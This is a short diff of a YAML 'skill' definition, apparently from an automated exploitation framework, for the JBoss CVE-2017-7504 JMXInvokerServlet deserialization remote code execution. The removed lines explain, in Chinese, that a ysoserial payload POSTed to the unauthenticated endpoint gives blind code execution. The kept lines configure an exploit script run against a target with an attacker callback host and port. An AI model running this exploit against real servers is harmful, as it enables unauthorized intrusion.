@@ -1,16 +1,8 @@
-# ═══════════════════════════════════════════════════════════
-# JBoss CVE-2017-7504 — JMXInvokerServlet 反序列化 RCE
-# ═══════════════════════════════════════════════════════════
 skill_id: jboss_deserial_rce
 name: "JBoss JMXInvokerServlet 反序列化 RCE (CVE-2017-7504)"
 category: java_deserialization
 phase: foothold
-version: "1.0"
-
-principle: |
-  JBoss AS 4.x 的 /invoker/JMXInvokerServlet 端点接受 Java 序列化对象，
-  无需认证。用 ysoserial + JDK 8 生成 payload 直接 POST 即可 RCE。
-  响应中无命令输出（盲执行），需回调或写文件确认。
+version: "2.0"
 
 match:
   rules:
@@ -55,7 +47,7 @@ exploit_paths:
         description: "ysoserial + 回调检测爆破"
         publish_ports: [39877]
         command: |
-          python3 /opt/jboss_exploit.py {ENDPOINT} \
+          python3 {skill_dir}/scripts/jboss_exploit.py {ENDPOINT} \
             --lhost "$LHOST" --port 39877 2>&1
         timeout: 300
         success_criteria:
